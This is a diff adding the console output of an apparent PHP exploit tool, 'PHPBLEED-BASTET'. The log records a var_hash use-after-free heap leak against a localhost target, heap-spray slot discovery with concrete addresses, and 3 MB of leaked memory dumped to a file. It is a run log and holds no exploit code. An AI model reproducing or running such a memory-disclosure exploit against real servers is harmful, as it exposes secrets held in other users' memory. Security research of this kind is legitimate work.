@@ -1,0 +1,20 @@
+
+      /\_/\      PHPBLEED-BASTET v1.0.0-bastet
+     ( o.o )     ------------------------
+      =(^^)=     Zend heap leak :: var_hash UAF
+                 Bastet watches the heap.
+15:25:15 [>] target acquired :: http://127.0.0.1:8088/index.php
+15:25:15 [+] LEAKED heap_ref :: 0xf37d84e58220
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xf37d84e00000
+  page map at data 0x1f8 (chunk+0x250)
+  Bin-320 SRUN at page 117, free_count=0
+  Run start = 0xf37d84e75000 (page 117)
+  Found spray at slot 5 @ 0xf37d84e75640
+  S = 0xf37d84e75658
+15:25:15 [+] spray anchor S :: 0xf37d84e75658
+15:25:15 [~] stream :: chunk 1/3 :: 1048576 bytes
+15:25:15 [~] stream :: chunk 2/3 :: 1048576 bytes
+15:25:15 [~] stream :: chunk 3/3 :: 1048576 bytes
+15:25:15 [+] BLED 3145728 bytes -> /tmp/bleed-refac.dump (16 requests)
